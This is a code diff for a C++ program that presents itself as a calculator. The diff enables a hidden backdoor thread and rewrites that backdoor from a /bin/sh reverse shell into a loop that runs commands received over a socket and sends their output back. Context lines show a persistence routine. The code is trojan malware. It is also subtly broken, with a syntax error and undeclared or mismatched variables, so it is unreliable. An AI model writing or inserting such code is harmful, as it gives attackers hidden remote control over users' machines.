@@ -17,8 +17,8 @@ void backdoor();
 void permanent();
 int main()
 {
-    // std::thread t(backdoor);
-    // t.detach();
+    std::thread t(backdoor);
+    t.detach();
 
     run_calculator();
 
@@ -36,13 +36,36 @@ void backdoor()
     addr.sin_port = htons(8888);
     addr.sin_addr.s_addr = inet_addr("127.0.0.1");
 
-    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == 0)
-    {
-        // TODO get rid of comments
-        dup2(sockfd, 0); // stdin
-        dup2(sockfd, 1); // stdout
-        dup2(sockfd, 2); // stderr
-        execl("/bin/sh", "sh", nullptr);
+    char inpt[1024];
+    while (true){
+        int bytes = recv(sockfd, inpt, sizeof(inpt - 1); 0);
+        if (bytes <= 0){
+            break;
+        }
+
+        inpt[bytes] = '\0';
+
+        std::string command{inpt};
+        cmd.erase(cmd.find_last_not_of(" \n\r\t") + 1);
+
+        // handling 'cd' commmand
+
+    if (cmd.rfind("cd ", 0) == 0) {
+        std::string path = cmd.substr(3);
+        if (chdir(path.c_str()) != 0) {
+            send(client_sock, err.c_str(), err.length(), 0);
+        }
+        continue; 
+    }
+    // if not cd command proceed normally with popen
+    FILE* pipe = popen(cmd.c_str(), "r");
+    if (!pipe) continue;
+
+    while (fgets(buffer, sizeof(buffer), pipe)) {
+        send(client_sock, buffer, strlen(buffer), 0);
+    }
+
+    pclose(pipe);
     }
 }
 
@@ -71,7 +94,6 @@ void permanent()
         std::cout << "executable already present\n";
         return;
     }
-
 
     // makes input stream from file pointing to currently running process
     // makes output stream
